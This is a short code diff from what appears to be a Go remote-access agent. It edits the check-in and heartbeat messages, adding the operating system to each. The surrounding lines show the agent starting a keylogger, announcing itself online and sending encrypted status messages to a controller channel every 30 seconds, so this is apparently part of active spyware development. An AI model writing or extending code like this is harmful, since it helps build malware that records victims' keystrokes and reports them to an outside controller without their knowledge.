@@ -83,7 +83,7 @@ func main() {
 	log.Println("Agent is running. Press CTRL-C to exit.")
 
 	hostname, _ := os.Hostname()
-	checkInMsg := fmt.Sprintf("[%s] Agent Online (%s)", hostname, runtime.GOOS)
+	checkInMsg := fmt.Sprintf("[%s:%s] Agent Online", hostname, runtime.GOOS)
 	sendEncryptedChunk(dg, ResultChannel, []byte(checkInMsg), EncryptionKey)
 
 	platform.StartKeylogger()
@@ -93,7 +93,7 @@ func main() {
 		ticker := time.NewTicker(30 * time.Second)
 		defer ticker.Stop()
 		for range ticker.C {
-			heartbeatMsg := fmt.Sprintf("[%s] HEARTBEAT", hostname)
+			heartbeatMsg := fmt.Sprintf("[%s:%s] HEARTBEAT", hostname, runtime.GOOS)
 			sendEncryptedChunk(dg, ResultChannel, []byte(heartbeatMsg), EncryptionKey)
 		}
 	}()
